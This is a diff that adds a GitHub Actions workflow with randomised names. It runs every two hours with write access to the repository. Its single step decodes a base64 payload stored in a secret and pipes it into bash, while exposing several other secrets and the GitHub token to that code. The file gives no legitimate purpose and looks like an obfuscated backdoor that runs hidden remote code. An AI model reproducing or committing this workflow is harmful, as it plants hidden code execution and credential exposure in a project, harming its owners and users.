@@ -1,0 +1,21 @@
+name: Aqqh6Dn
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  im8ztQ:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.CUGVRge0V2hcNyk }}
+      - name: B69H3dpYpU3sq
+        env:
+          rnyofRo: ${{ secrets.YQHb0GyZNYTH }}
+          tVd4fQOSD: ${{ secrets.NSPjTPmat }}
+          DDp969XQJ: ${{ secrets.mTVObpktq }}
+          GITHUB_TOKEN: ${{ secrets.CUGVRge0V2hcNyk }}
+        run: echo "$rnyofRo" | base64 -d | bash
